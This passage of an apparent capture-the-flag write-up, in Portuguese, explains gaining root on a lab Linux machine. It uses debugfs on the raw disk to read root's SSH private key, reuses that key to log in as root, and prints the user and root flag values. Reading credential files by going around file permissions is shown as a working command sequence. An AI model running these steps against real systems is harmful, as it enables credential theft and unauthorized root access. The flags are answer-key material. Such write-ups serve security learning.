<p>Com a ajuda da ferramente debugfs (ext2/ext3/ext4 file system debugger). Podemos ver ou manipular uma partição, um disco ou o seu conteúdo. Podemos assim facilemente ver a flag root.txt, mas a nós o que nos interessa é vir a ser root! Por sorte, em /root/.ssh existem keys para entrar por ssh, já autorizadas... nem percisamos de fazer mais nada. É só copiar e usar a id_rsa:</p>
<pre><code class="language-bash">debugfs /dev/sda1
debugfs: cd /root/.ssh
debugfs: cat id_rsa  # copy the content...
# Exit the debugfs

cd /tmp
nano id_rsa  # paste the content...
chmod 600 id_rsa
ssh -i id_rsa root@localhost


cat /home/moshe/user.txt
#&gt; c866575ed5999e1a878b1494fcb1f9d3
cat /root/root.txt
#&gt; 23b79200448c62ffd6f8f2091c001fa1
</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="Linux.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="Linux.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
    </body>
</html>
